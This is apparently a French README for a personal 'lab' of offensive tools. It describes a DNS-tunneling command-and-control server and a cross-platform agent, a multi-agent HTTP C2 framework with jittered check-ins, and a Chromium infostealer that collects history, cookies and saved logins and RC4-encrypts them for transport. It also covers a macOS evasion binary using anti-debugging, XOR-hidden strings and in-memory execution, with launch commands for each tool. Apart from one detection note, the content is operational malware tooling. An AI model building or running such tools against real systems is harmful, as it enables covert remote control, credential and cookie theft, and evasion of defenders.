# S.T.A.R. LABS — powered by Maxime Leal

Le labo de recherche : C2 à travers le DNS, framework C2 multi-agent, infostealer
Chromium, évasion macOS. Lancement : `python3 star_dns_c2_server.py` etc. (tools en direct).

---

## 1 — DNS C2 SERVER (`star_dns_c2_server.py`)
**Quoi** : serveur DNS de commandes — les tâches voyagent **dans les réponses DNS** (champ A),
les résultats reviennent **dans les noms de requêtes** (base32). Aucun port TCP ouvert, aucun flux non-DNS.
**Usage** : `python3 star_dns_c2_server.py 5353` → tape une commande à l'invite → elle part au prochain check-in de l'agent.
**Limite lab** : 4 octets de commande par réponse (longueur d'une IP) — `id`, `date`, `ls`… Le chunking complet est l'étage suivant.

## 2 — DNS C2 AGENT (`build/star_dns_agent`)
**Quoi** : l'agent compilé (C, natif mac) : check-in DNS toutes les 10 s, exécution de la tâche, renvoi du résultat en requête b32. Compile aussi pour Windows (Winsock).
**Usage** : `./build/star_dns_agent <ip_serveur> <port>` — testé en boucle locale : tâche `id` → résultat `uid=501(...)` revenu à travers le DNS ✓
**Détection** : requêtes DNS avec labels longs base32 = IOC majeur de tunneling DNS.

## 3 — C2 FRAMEWORK (`star_c2_server.py` + `star_c2_agent.py`)
**Quoi** : serveur C2 HTTP multi-agent : check-in, file de tâches par agent, résultats loggés horodatés.
**Usage** :
- serveur : `python3 star_c2_server.py 8090`
- agent : `python3 star_c2_agent.py 127.0.0.1 8090 monagent`
- console : `task monagent whoami` · `agents` · `results`
**Note** : jitter aléatoire du check-in (jamais deux patterns identiques).

## 4 — INFOSTEALER CHROMIUM (`star_infostealer.py`)
**Quoi** : scanne Chrome/Edge/Brave : historique, téléchargements, cookies (structure), logins (sites + users).
**Usage** : `python3 star_infostealer.py [clé_rc4]`.
**Sortie** : `sorties/infostealer_clair.json` (lecture) + `sorties/infostealer.bin` (RC4, transport).
**Note** : les mots de passe Chromium sont chiffrés Keychain (v10) sur mac — la table expose sites et users, les valeurs attendent un lab keychain.

## 5 — EVASION (`build/star_evasion`)
**Quoi** : démonstration des trois piliers d'évasion macOS : `PT_DENY_ATTACH` (refuse tout debugger), strings xorées en mémoire (jamais en clair dans le binaire), exec mémoire (RW→RX, respect du W^X Apple Silicon).
**Usage** : `./build/star_evasion` — affiche l'état anti-debug et exécute une page mémoire.
